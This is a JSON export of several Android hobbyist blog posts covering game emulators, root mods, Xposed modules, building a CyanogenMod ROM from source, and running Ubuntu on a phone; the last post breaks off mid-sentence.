[
    {
        "uri": "/content/page/search",
        "title": "Search",
        "content": "    \n      \n      \n        Search\n      \n    \n    \n    \n    \n    \n  \n\n\n\n\n",
        "tags": []
    },
    {
        "uri": "/play-playstation-games-on-android/",
        "title": "Play PlayStation Games on Android",
        "content": "{{ youtube UA9WCJO6X44 }}\r\n\r\nDo you miss the good old PlayStation days? I am talking about the original PlayStation with the 1MB Memory cards (I had a lot of those) and the boring yet simplistic outer-body design?  If so, there is hope for you. Thanks to multiple apps in the Play Store, you can play PlayStation games on Android.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nEmulation has come so far on Android. It amazes me at just how many titles are compatible with the PlayStation emulators. Speaking of which, I am going to use the popular emulator called Fpse. In my experience, I found that this emulator works the best and will guarantee you a large collection of compatible titles. Also, it features nifty features like quick save state (goodbye 1MB memory cards) and allows you to customize many of the in-game emulation settings. However, don&#8217;t feel obligated to use Fpse. There are many other good PSX emulators appearing in the Play Store.\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.emulator.fpse&hl=en\" target=\"_blank\"Fpse/a\r\n  PSX Game ISO\r\n  a href=\"http://www.loveroms.com/extras/psx-bios.php\" target=\"_blank\"Playstation Bios File/a\r\n\r\n The Simple Process\r\n\r\nOkay, so the first thing you need to do is find the ISO or BIN of the game that you want to play. If you have the PlayStation disc, then there are tools on the web that you can use to get the game data off of it. Otherwise, just Google search.\r\n\r\nspan style=\"color: #0000ff;\"**If the game you&#8217;re trying to use is in a ECM format, you can use thespan style=\"color: #ff0000;\"a style=\"color: #ff0000;\" href=\"http://www.emuparadise.me/PSX/ecm%20tools.rar\" target=\"blank\" unecm tool/a/span to convert it. Simply drag the ECM file to the unecm application in your file explorer.**/span_\r\n\r\nAfterwards, download the PlayStation Bios zip and unzip it. You should see SCPH1001.BIN. Transfer the bios and game to your phone.\r\n\r\nFinally, on Fpse, load the bios file and the game. To load the bios go to *Settings &#8211; Misc &#8211; Paths &#8211; Load Bios. *The app will automatically scan your phone for any games.\r\n\r\n\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/06/Screenshot_2015-06-12-22-56-06.jpg\r\n",
        "tags": [
            "android",
            "emulation",
            "emulators",
            "fpse",
            "games",
            "play",
            "playstation",
            "psx"
        ]
    },
    {
        "uri": "/android-floating-window/",
        "title": "Android Floating Window",
        "content": "\n\nspan style=\"color: #2a1e1e;\"One of the most iconic features of the Galaxy Note 3, is the multi-window feature.  It&#8217;s extremely cool and makes great use of the abundance of screen real estate.  Unfortunately, that&#8217;s not a  native Android feature.  However, with the help of an Xposed Module, you can achieve the floating affect on any android device.  Here&#8217;s how to get Android floating window display:/span\n\nWhat You Will Need:\n\n  A rooted Android Device\n  Xposed Installer App\n  a href=\"https://docs.google.com/file/d/0B7CBSsJQIV5-ZTNnbVRXbk5OeVk/edit\" target=\"blank\"Halo App(Android 4.2+)/a or Halo a href=\"https://docs.google.com/file/d/0B7CBSsJQIV5-VGJyNVpSLXg2UHc/edit\" target=\"blank\"(Android 4.0+)/a span style=\"color: 2a1e1e;\"(Courtesy of XDA Forum Member zst123)/span\n\nStep 1: Installing Xposed Framework\n\nspan style=\"color: 2a1e1e;\"First, download and install the Xposed installer app to your device.  Open it up, and choose the framework tab.  Then, select the option to /spanem style=\"color: #2a1e1e;\"Download/Update /emem style=\"color: #2a1e1e;\"Framework./emspan style=\"color: #2a1e1e;\"  It will ask you for superuser permission.   After you grant it superuser permission, it will download and install the framework.  You must /spanstrong style=\"color: #2a1e1e;\"reboot your device./strong\n\nStep 2: Install Halo Apk\n\nAfter your device has rebooted, install the Halo Apk posted above.\n\n Step 3: Install XhaloFloatingWindow\n\nNow go inside the Xposed Installer App, and go to the download section.\n\nLook for a module called XhaloFLoatingWindow and download it.\n\nAfterwards, go back to the module section and select the _xHaloFloatingWindow _module to activate it.  Again, you will need to reboot.\n\nStep 4: Setting up Halo\n\nspan style=\"color: 2a1e1e;\"Now open up the Halo app, and choose the applications that you want to pin.  These apps will remain in your notification tray and will open up in a pop-up window when you select them./span\n\nStep 5: Customize Behavior\n\nspan style=\"color: 2a1e1e;\"Finally, you can open the emxHaloFloatingWindow/em module that you downloaded (it will be in your app drawer) and customize the behavior of the floating windows. You can customize where it appears, if it&#8217;s movable and much more./span\n\n&nbsp;\n\n{{ youtube 0WfYtFaVx38 }}\n\n",
        "tags": [
            "android",
            "any",
            "diplay",
            "drag",
            "floating",
            "galaxy",
            "hack",
            "mod",
            "movable",
            "multiwindow",
            "note",
            "smartphone",
            "touchwiz",
            "window",
            "xpose"
        ]
    },
    {
        "uri": "/how-to-play-nintendo-ds-games-on-android/",
        "title": "How to Play Nintendo DS Games on Android",
        "content": "The Nintendo DS was by far one of my favorite portable game systems.  However, these were the days before smartphone gaming became the norm.  If you&#8217;re feeling nostalgic and in the mood to play some DS games on your Android device, it&#8217;s very easy thanks to the DraStic DS emulator. Here&#8217;s how to play Nintendo DS games on Android:\n\nWhat You&8217;ll Need:\n\n  A Nintendo Game (nds Rom)(You can Google it)\n  a href=\"https://play.google.com/store/apps/details?id=com.dsemu.drasticdemo\" target=\"_blank\"DraStic DS Emulator (Demo)/a\n  a href=\"https://play.google.com/store/apps/details?id=com.dsemu.drastic\" target=\"_blank\"DraStic DS Emulator (Full)/a\n\nStep 1: Transferring the Rom to Your Device\n\nspan style=\"color: 2a1e1e;\"The first thing you need to do is transfer the Rom to your device.  If it&#8217;s in a .zip archive or .7z folder, extract it and transfer the whole folder to your device./span\n\nStep 2: Download Drastic DS Emulator\n\nspan style=\"color: 2a1e1e;\"You can choose to download the demo version, however for full functionality the paid version is what you want.  After you download it, open it and select the location of the game that you want to play.  Now you&#8217;re ready to play!  The game I used was Animal Crossing.  The performance was just as smooth as I come to expect from the Nintendo DS and the controls weren&#8217;t difficult to operate.  I like how the emulator gives you the options to split your screen horizontally or vertically./span\n\n&nbsp;\n\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/nds1.jpg\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/download-21.jpg\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/nds3.jpg\n",
        "tags": [
            "android",
            "animal crossing",
            "droid",
            "ds",
            "emulate",
            "galaxy",
            "games",
            "htc",
            "lg",
            "lite",
            "mario",
            "nexus",
            "nintendo",
            "play",
            "smartphone",
            "virtual",
            "virtualiziation"
        ]
    },
    {
        "uri": "/android-boost-speaker-volume/",
        "title": "Android Boost Speaker Volume",
        "content": "\n\nspan style=\"color: #000000;\"Let&#8217;s face it. Even at max volume, sometimes the speaker on your phone just isn&#8217;t loud enough (Yes, I&#8217;m looking at you Nexus 5).  However, you could digitally raise the maximum volume that the speaker allows itself to go to. This will require a rooted android device and could run the risk of damaging your speakers if you go too high, so be warned./span\n\nWhat You will Need:\n\n  A rooted Android Device\n  a href=\"https://play.google.com/store/apps/details?id=com.estrongs.android.pop&hl=en\" target=\"_blank\"ES File Explorer/a\n\n Step 1: Mounting the System\n\nspan style=\"color: #2a1e1e;\"Open up ES file explorer and enable the root explorer.  Then tap on the root explorer tab and a menu will pop up.  Select the Mount R/W tab and mount both /spanem style=\"color: #2a1e1e;\"system and / /emspan style=\"color: #2a1e1e;\"as /spanstrong style=\"color: #2a1e1e;\"r/w./strong\n\nStep 2: Locating the mixer_paths.xml\n\nspan style=\"color: 2a1e1e;\"Now, navigate to /spanstrong style=\"color: #2a1e1e;\"/emSystem/etc /em/strongspan style=\"color: #2a1e1e;\"and open up the /spanstrong style=\"color: #2a1e1e;\"mixer_paths.xml /strongspan style=\"color: #2a1e1e;\"with ES note editor.  Before you start making changes, go up into the settings and select /spanem style=\"color: #2a1e1e;\"edit /emspan style=\"color: #2a1e1e;\"on the file./span\n\nStep 3: Changing the Speaker Volume\n\nspan style=\"color: 2a1e1e;\"To change the speaker volume, look for the line /spanstrong style=\"color: #2a1e1e;\"RX7 Digital Volume/strongspan style=\"color: #2a1e1e;\" under the /spanstrong style=\"color: #2a1e1e;\"Path name= Speaker/strongspan style=\"color: #2a1e1e;\" and change the value to whatever you desire.  (Going over 95 has the potential of blowing your speaker though)./span\n\nStep 4: Changing the Headphone Volume\n\np id=\"yui3_1011_139561493528040048\" style=\"color: 2a1e1e;\"\n  To change the headphone volume,  look for the lines:\n/p\n\np id=\"yui3_1011_139561493528040609\" style=\"color: #2a1e1e;\"\n  strong id=\"yui3_1011_139561493528040160\"ctl name=&#8221;HPHL Volume&#8221; /</strong\n/p\n\np id=\"yui3_1011_139561493528040485\" style=\"color: #2a1e1e;\"\n  strong id=\"yui3_1011_139561493528040160\"ctl name=&#8221;HPHR Volume&#8221; //strong\n/p\n\np id=\"yui3_1011_139561493528042895\" style=\"color: #2a1e1e;\"\n  Change the values to 20.  Don&#8217;t go beyond 20.  You can also change the RX1 and RX2 values to something like 85, once again, don&#8217;t go beyond 95.\n/p\n\np style=\"color: #2a1e1e;\"\n\n/p\n\np style=\"color: #2a1e1e;\"\n  Afterwards, strongreboot /strongand you should notice an increase in volume.  Feel free to play around with the other volume settings found in the mixer_paths.xml, just make sure you have a backup and not to blow out your speaker! Android Boost speaker volume success!\n/p\n\np style=\"color: #2a1e1e;\"\n  iframe src=\"//www.youtube.com/embed/kyCxhpo5PHE\" width=\"560\" height=\"315\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\"/iframe\n/p\n\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/sound-mod.jpg\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/download-24.jpg\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/download-23.jpg\n [4]: http://www.davebennett.tv/wp-content/uploads/2014/07/download-22.jpg\n [5]: http://www.davebennett.tv/wp-content/uploads/2014/07/download-25.jpg\n [6]: http://www.davebennett.tv/wp-content/uploads/2014/07/r5.jpg\n\n",
        "tags": [
            "android",
            "boost",
            "db",
            "galaxy",
            "hack",
            "headphone",
            "level",
            "max",
            "mixer paths",
            "mod",
            "nexus",
            "nexus 5",
            "root",
            "samsung",
            "smartphone",
            "sound",
            "speaker",
            "tablet",
            "volume",
            "xml"
        ]
    },
    {
        "uri": "/enable-ultra-high-graphics-dead-trigger-2/",
        "title": "Enable Ultra High Graphics Dead Trigger 2",
        "content": "\r\n\r\n\r\nIt&#8217;s not surprising that certain games purposefully limit the maximum graphics level that the user could set. However, it becomes an issue when the device you&#8217;re playing on is more than capable of handling the maximum graphics level, even though the developers didn&#8217;t think so. Unfortunately, Dead Trigger 2 is a perfect example of this scenario.  Fortunately, with a little file modification you can enable the secret &#8220;ultra&#8221; graphics mode only accessible to latest generation iPhones and Tegra devices.  You will need to have a rooted Android device in order to do this.\r\n\r\nWhat You Will Need:\r\n\r\nA rooted Android Device\r\na href=\"https://play.google.com/store/apps/details?id=com.estrongs.android.pop&hl=en\" target=\"_blank\"ES File Explorer/a\r\na href=\"https://play.google.com/store/apps/details?id=com.madfingergames.deadtrigger2&hl=en\" target=\"_blank\"Dead Trigger 2/a\r\n\r\n Step 1: Graphics Setting\r\n\r\nBefore you do anything, launch Dead Trigger 2 and set the graphics level to high.\r\n\r\n\r\n\r\nStep 2: Force Stop the App\r\n\r\nNext, you will need to make sure the app is completely closed down before you start modding. To force close, go into the settings &8211; apps &#8211; Dead Trigger 2 and force stop the app.\r\n\r\n\r\n\r\nStep 3: Enable Root Explorer in ES File Explorer\r\n\r\nYou need to enable root so that you can navigate to the data folder.\r\n\r\n\r\n\r\n Step 4: Open XML File\r\n\r\nspan style=\"color: #2a1e1e;\"Now navigate to /spani style=\"color: #2a1e1e;\"/data/data/com.madfingergames.deadtrigger2/shared_prefs//ispan style=\"color: #2a1e1e;\" folder and open the /spani style=\"color: #2a1e1e;\"com.madfingergames.deadtrigger2.xml/ispan style=\"color: #2a1e1e;\" file. Use the ES note editor./span\r\n\r\n\r\n\r\nStep 5: Changing Values\r\n\r\nspan style=\"color: 2a1e1e;\"Now change the following values. Change the /spani style=\"color: #2a1e1e;\"Unity Graphics Detail/ispan style=\"color: #2a1e1e;\" to /spani style=\"color: #2a1e1e;\"3 /ispan style=\"color: #2a1e1e;\"and the /spani style=\"color: #2a1e1e;\"Options Graphic Detail/ispan style=\"color: #2a1e1e;\" to /spani style=\"color: #2a1e1e;\"3/ispan style=\"color: #2a1e1e;\". Then save it. (Hit the back arrow in the top left hand corner)./span\r\n\r\n\r\n\r\nStep 6: Changing Permissions\r\n\r\nspan style=\"color: 2a1e1e;\"You&#8217;re almost done. The last thing to do is change the permissions on the file. Select it, then go down to properties. Remove all the write permissions.  That way, the game won&#8217;t try to revert the setting./span\r\n\r\n\r\n\r\nStep 7: Now Play\r\n\r\nspan style=\"color: 2a1e1e;\"That&#8217;s it! Now when you go to your game, you will not see Ultra High Graphics option in the setting menu, however the game will be running at ultra high graphic detail. You should be easily able to tell by the added textures and reflections.  There you have it, ultra high graphics Dead Trigger 2./span\r\n\r\n\r\n\r\n{{ youtube mKV9Gy1_eYM }}\r\n\r\n&nbsp;\r\n\r\n[1]: http://www.davebennett.tv/wp-content/uploads/2014/07/d291.jpg\r\n[2]: http://www.davebennett.tv/wp-content/uploads/2014/07/d21.jpg\r\n[3]: http://www.davebennett.tv/wp-content/uploads/2014/07/d23.jpg\r\n[4]: http://www.davebennett.tv/wp-content/uploads/2014/07/d24.jpg\r\n[5]: http://www.davebennett.tv/wp-content/uploads/2014/07/d25.jpg\r\n[6]: http://www.davebennett.tv/wp-content/uploads/2014/07/d27.jpg\r\n[7]: http://www.davebennett.tv/wp-content/uploads/2014/07/d26.jpg\r\n[8]: http://www.davebennett.tv/wp-content/uploads/2014/07/d28.jpg\r\n[9]: http://www.davebennett.tv/wp-content/uploads/2014/07/d29.jpg\r\n",
        "tags": [
            "android",
            "dead",
            "droid",
            "galaxy",
            "game play",
            "gaming",
            "google",
            "graphics",
            "hack",
            "high",
            "htc",
            "lg",
            "mod",
            "nexus",
            "quality",
            "root",
            "smartphone",
            "trigger",
            "ultra"
        ]
    },
    {
        "uri": "/how-to-install-xposed-framework/",
        "title": "How to Install Xposed Framework",
        "content": "\r\n\r\nXposed is a popular framework that allows you to modify and customize your Android device without having to flash a new rom. It allows you to use a variety of apps and tools (such as gravity box) that extend what you can achieve with your Android device.  If you&#8217;re tinkerer or someone who thrives on complete control, than Xposed it what you want. For more techinical details on Xposed read a href=\"http://forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053\" target=\"_blank\"this/a. In order to use Xposed, you will need to have a rooted Android device. You will also need to be on the dalvik runtime (if you won&#8217;t know what that is, then don&#8217;t worry. You&#8217;re probably already on it). Here&#8217;s how to install Xposed framework:\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"http://dl.xposed.info/latest.apk\" target=\"_blank\"Xposed Installer/a\r\n  A rooted Android Device\r\n\r\n Step 1: Downloading the Installer\r\n\r\nDownload and install the Xposed Installer Apk (listed above) to your Android device.\r\n\r\nStep 2: Installing the Framework\r\n\r\nAfter you installed the Installer app, launch the app on your device. Tap on framework, then tap on Install/Update.  This will install the Xposed framework.  You will need to reboot .\r\n\r\n\r\n\r\n Step 3: Downloading Modules\r\n\r\nspan style=\"color: #2a1e1e;\"Now to download a module, tap on download.  From here, you can access a whole gallery of different themes, mods, and simple hacks.  Not all of them will be compatible for your device, so make sure you read the description closely.  Once you find one that you like, select it, and hit download/span\r\n\r\n\r\n\r\nStep 4: Activating Modules\r\n\r\nspan style=\"color: 2a1e1e;\"After you download a module, you will need to activate it. Tap on modules, and select the module you want to activate.  You will need to perform a strongreboot/strong in order for it to take effect.  And that&#8217;s it!  Definitely play around with it, and try out different mods for your device./span\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n{{ youtube FBICRQ4ruwM }}\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/xposed.jpg\r\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/Screenshot_2014-07-02-10-24-16.png\r\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/Screenshot_2014-07-02-10-24-28.png\r\n [4]: http://www.davebennett.tv/wp-content/uploads/2014/07/Screenshot_2014-07-02-10-24-43.png\r\n [5]: http://www.davebennett.tv/wp-content/uploads/2014/07/Screenshot_2014-07-02-10-29-32.png\r\n",
        "tags": [
            "android",
            "customize",
            "dalvik",
            "flash",
            "framework",
            "galaxy",
            "google",
            "gravitybox",
            "hack",
            "how",
            "install",
            "lg",
            "mod.rom",
            "nexus",
            "root",
            "samsung",
            "sense",
            "smartphone",
            "theme",
            "to",
            "touchwiz",
            "xpose",
            "xposed"
        ]
    },
    {
        "uri": "/how-to-build-custom-cyanogenmod-rom/",
        "title": "How to Build Custom Cyanogenmod Rom",
        "content": "{{ youtube GAyxypK7_K8 }}\r\n\r\nBuild Custom Cyanogenmod Rom? So are you ready to take on Rom Development? That&#8217;s okay if you&#8217;re not, because I&#8217;ll help walk you through it. In this tutorial, I&#8217;m going to show you how to build your own Cyanogenmod Rom right from source. This sounds a lot more complicated than it actually is though. However, keep in mind that you will need a lot of patience when doing this. For this tutorial, I&#8217;m going to assume that you have Linux up and running and you&#8217;re familiar with basic Linux and Android operations.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nspan style=\"line-height: 1.5;\"Depending on your computer and internet speeds this could take anywhere from 5 hours (no less than that) to 5 days to complete. You&#8217;re going to be downloading over 15 GB in source code. In addition, your computer hardware will determine how fast your compiling process will take.  I have a Core i7 3770k along with 16GB of ram and it took 45min-1 hour. So just be aware that this isn&#8217;t a ten minute process. One final note, I compiled this tutorial with the help of several references found /spana style=\"line-height: 1.5;\" href=\"http://wiki.cyanogenmod.org/w/Buildform7att\" target=\"blank\"here/aspan style=\"line-height: 1.5;\", /spana style=\"line-height: 1.5;\" href=\"http://forum.xda-developers.com/showthread.php?t=1971645\" target=\"blank\"here/aspan style=\"line-height: 1.5;\" and /spana style=\"line-height: 1.5;\" href=\"http://ding34.blogspot.com/2013/05/extract-filessh-remote-object-does-not.html\" target=\"_blank\"here/aspan style=\"line-height: 1.5;\"; so if you don&#8217;t like the way I do things feel free to pull information from any of those other guides./span\r\n\r\nWhat You Will Need:\r\n\r\n  span style=\"color: 2a1e1e;\"An already built CyanogenMod Zip for your device (Doesn&#8217;t matter if it&#8217;s a nightly or stable)./span\r\n  A Computer running Linux or OSX (Virtualbox is acceptable too).\r\n  At least 35GB of free space on your Hard Drive\r\n  Patience!\r\n\r\nStep 1: Setting up Bashrc\r\n\r\np style=\"color: 2a1e1e;\"\r\n  To make life easier, let&#8217;s add bin as a path.  In a terminal window type in\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    sudo gedit ~/.bashrc\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n   At the very end of the file add the following:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    export PATH=${PATH}:~/bin\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  In just a little bit we&#8217;re going to be creating a bin directory, so it&#8217;s helpful to do it now.\r\n/p\r\n\r\np style=\"color: #2a1e1e;\"\r\n\r\n/p\r\n\r\nHit save once your done and close it.  Now in terminal type in\r\n\r\n ~/.bashrc\r\n\r\nThis will re-load your bashrc. (Rebooting would do the same thing, but that&#8217;s no fun).\r\n\r\nStep 2: Preparing Your Build Environment\r\n\r\np style=\"color: 2a1e1e;\"\r\n  Alright, there are multiple things you&#8217;re going to need to install before you can start cooking.  Simply copy and paste this into terminal.  (This was taken straight from the Cyanogen wiki page)\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    sudo apt-get install git-core gnupg flex bison gperf libsdl1.2-dev libesd0-dev libwxgtk2.8-dev squashfs-tools build-essential zip curl libncurses5-dev zlib1g-dev openjdk-6-jre openjdk-6-jdk pngcrush schedtool libxml2 libxml2-utils xsltproc\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  And if you&#8217;re running a 64 bit System, paste this into terminal as well:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    g++-multilib lib32z1-dev lib32ncurses5-dev lib32readline-gplv2-dev gcc-multilib\r\n  /p\r\n/blockquote\r\n\r\nStep 3:Directories\r\n\r\nspan style=\"color: 2a1e1e;\"Alright, time to make some directories. In your home folder, let&#8217;s create a directory called /spanem style=\"color: #2a1e1e;\"bin/emspan style=\"color: #2a1e1e;\". That will hold the repo stuff.  For the actual source files let&#8217;s create a directory called /spanem style=\"color: #2a1e1e;\"CM10.2/emspan style=\"color: #2a1e1e;\"(You don&#8217;t have to call it cm10.2, you can name it to whatever you want, just note that I&#8217;m always going to refer to it as cm10.2 in this tutorial).  You can create these directories easily by typing the following in terminal:/span\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    mkdir -p ~/bin\r\n  /p\r\n/blockquote\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    mkdir -p ~/CM10.2\r\n  /p\r\n/blockquote\r\n\r\nStep 4: Installing Repo\r\n\r\np style=\"color: 2a1e1e;\"\r\n  Now let&#8217;s download the repo file and change its permissions so that we can execute it.  In terminal type in:\r\n/p\r\n\r\nblockquote id=\"yui3_1721_1404704780469904\" style=\"color: #2a1e1e;\"\r\n  p id=\"yui3_1721_1404704780469903\"\r\n    curl https://dl-ssl.google.com/dl/googlesource/git-repo/repo  ~/bin/repo br /br / chmod a+x ~/bin/repo\r\n  /p\r\n/blockquote\r\n\r\n\r\n\r\nStep 5: span style=\"color: 2a1e1e;\"Iniinitialize CM Source and Downloading the Source Code/span\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Now it&#8217;s time to initialize the source code to download.  In terminal change to your CM10.2 directory.  So type:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    cd ~/CM10.2\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Now we need to decide what version of cyanogenmod we want to get.  I&#8217;m going to go with 10.2 since I know there is source available for my device, but you can choose whichever build you like.  So type in:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    repo init -u git://github.com/CyanogenMod/android.git -b cm-10.2\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Just a quick note, if this is your first time using repo you might be prompted to type in your email address and name. Finally, when you&#8217;re ready type in:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    repo sync\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  This will begin long process of downloading over 15GB of source code.  This will take anywhere between 4 hours to 4 days depending on your internet speed.  Get that coffee ready!\r\n/p\r\n\r\np style=\"color: #2a1e1e;\"\r\n\r\n/p\r\n\r\np style=\"color: #2a1e1e;\"\r\n  emNote: If repo gets stuck or freezes during the download, just hit control + z to stop it, and type &#8220;repo sync&#8221; again./em\r\n/p\r\n\r\nh2 style=\"color: #2a1e1e;\"\r\n  Step 6: Prebuilt Apps\r\n/h2\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Congratulations! You made it through one of the longest steps! You&#8217;re halfway there. Now let&#8217;s get the prebuilt apps.  In terminal type in the following:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    cd ~/cm10.2/vendor/cm\r\n  /p\r\n  \r\n  p\r\n    ./get-prebuilts\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Cool. No Confirmation will appear so you&#8217;ll just have to trust it happened.\r\n/p\r\n\r\nh2 style=\"color: #2a1e1e;\"\r\n  Step 7: Device Specific Code\r\n/h2\r\n\r\nNow it&#8217;s time to prepare the device specific code. In terminal type the following:\r\n\r\nblockquote id=\"yui3_1721_14047047804691006\"\r\n  p id=\"yui3_1721_14047047804691005\"\r\n    cd ~/cm10.2\r\n  /p\r\n  \r\n  p\r\n    source build/envsetup.sh\r\n  /p\r\n  \r\n  p\r\n    breakfast m7spr (After breakfast you&#8217;re typing in your device&#8217;s name.  Look it up if you&#8217;re not sure. I&#8217;m using a sprint htc one, so it&#8217;s m7spr)\r\n  /p\r\n/blockquote\r\n\r\nThe device specific code will download.\r\n\r\n\r\n\r\nStep 8: Extract Proprietary Blobs\r\n\r\np style=\"color: 2a1e1e;\"\r\n  In order to get the device specific files, you&#8217;re going to need to have an already built CyanogenMod rom for your device.  Now this process could be accomplished through the actual device but I&#8217;m going to show your through the zip (it&#8217;s easier and less of a hassle).  Make a new folder called original in your home folder, and extract the zip to that folder.\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    mkdir -p ~/original\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Then in terminal type in the following commands:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    cd ~/cm10.2/device/htc/m7spr\r\n  /p\r\n  \r\n  p\r\n    ./extract-files.sh ~/original\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Of course replace m7spr and cm10.2 with the appropriate device and zip you used.\r\n/p\r\n\r\np style=\"color: #2a1e1e;\"\r\n\r\n/p\r\n\r\nGreat! You&#8217;re almost done.  According to the CyanongenMod wiki we can also turn on cache building to speed up subsequent builds after this one.  Type in:\r\n\r\n export USE_CCACHE=1\r\n\r\nStep 9: Starting the Build\r\n\r\np style=\"color: 2a1e1e;\"\r\n  Now the moment you have been waiting for. It&#8217;s time to start building your CM Rom. Type in the following:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    croot\r\n  /p\r\n  \r\n  p\r\n    brunch m7spr\r\n  /p\r\n/blockquote\r\n\r\np style=\"color: #2a1e1e;\"\r\n  Again, replace m7spr with your device.  If you get any errors, here are some helpful tips taken right from wiki.cyanogenmod.org:\r\n/p\r\n\r\nblockquote style=\"color: #2a1e1e;\"\r\n  p\r\n    emIf the build doesn&#8217;t start, try lunch and choose your device from the menu. If that doesn&#8217;t work, try breakfast and choose from the menu. The command make m7att should then work. A second, bonus tip! If you get a command not found error for croot or brunch or lunch, be sure you&#8217;ve done the &#8220;strong. build/envsetup.sh/strong”command in this Terminal session from the ~/cm10.2 directory/em\r\n  /p\r\n/blockquote\r\n\r\nh2 style=\"font-weight: 400; color: #e81139;\"\r\n  span style=\"color: #000000;\"Step 10: That&#8217;s it!/span\r\n/h2\r\n\r\nspan style=\"color: #2a1e1e;\"Hopefully your build completed without errors. If you have any errors refer to /spana style=\"color: #e5562e;\" href=\"http://wiki.cyanogenmod.org/w/Buildform7att\" target=\"_blank\"here/aspan style=\"color: #2a1e1e;\" if you have any trouble. Now the last thing to do is grab your newly built cyanogenmod zip.  Simply go into the /spanem style=\"color: #2a1e1e;\"out/target/product/m7spr/emspan style=\"color: #2a1e1e;\" folder and you should see your cyanogenmod zip.  From here you can flash it in recovery on your phone.  Hope you enjoyed and have fun! /span\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/repo.png\r\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/m7spr.png\r\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/out.png\r\n",
        "tags": [
            "android",
            "build",
            "compile",
            "custome",
            "cyanogenmod",
            "developer",
            "device",
            "flash",
            "from",
            "galaxy",
            "guide",
            "lg",
            "linux",
            "mac",
            "nexus",
            "recovery",
            "rom",
            "root",
            "source",
            "straight",
            "tablet",
            "virtualbox",
            "windows"
        ]
    },
    {
        "uri": "/run-ubuntu-13-10-on-android/",
        "title": "Run Ubuntu 13.10 on Android",
        "content": "\r\n\r\n\r\nspan style=\"color: #2a1e1e;\"How would it feel to have the power of a desktop operating system in the palm of your hands? If you&#8217;re a power user, and also a fan of Linux, then you came to the right place. Running Ubuntu 13.10 on your Android device is not very hard to do. Don&#8217;t think that this is some slow or stripped down version of Ubuntu. You will have access to all your favorite Linux apps and commands. However, you will need to have a rooted Android device in order to do this. Here&#8217;s how to run Ubuntu 13.10 on Android:/span\r\n\r\nWhat You Will Need:\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.zpwebsites.linuxonandroid&hl=en\" target=\"_blank\"Complete Linux Installer/a\r\na href=\"https://play.google.com/store/search?q=terminal%20emulator&c=apps&hl=en\" target=\"_blank\"Terminal Emulator/a\r\na href=\"https://play.google.com/store/apps/details?id=com.realvnc.viewer.android\" target=\"_blank\"Android VNC/a\r\na href=\"https://play.google.com/store/apps/details?id=com.metago.astro&hl=en\" target=\"_blank\"Astro File Manager/a(or any of your choice)\r\na href=\"https://play.google.com/store/apps/details?id=com.mrbimc.selinux&hl=en\" target=\"_blank\"SE Linux Mode Changer/a(If you&8217;re running Android 4.4 or above).\r\nA rooted Android Device\r\n1-4GB of Free Space\r\n\r\nStep 1: Enabling USB Debugging and Installing Complete Linux Installer\r\n\r\nspan style=\"color: 2a1e1e;\"First thing first, download Complete Linux Installer and all the other applications above.  Then open Complete Linux Installer. Go to the install tab and choose Ubuntu 13.10.  On page 2, it will prompt you to enable USB debugging.  To enable USB debugging, go to your /spanstrong style=\"color: #2a1e1e;\"settings, /strongspan style=\"color: #2a1e1e;\"then go to /spanstrong style=\"color: #2a1e1e;\"about phone/tablet./strongspan style=\"color: #2a1e1e;\"  Tap on the /spanstrong style=\"color: #2a1e1e;\"build number/strongspan style=\"color: #2a1e1e;\" 10 times.It will prompt you with &#8220;emYou are now a developer/em&#8220;.  Go back into settings, you should see a tab called developer options. Within that tab enable USB 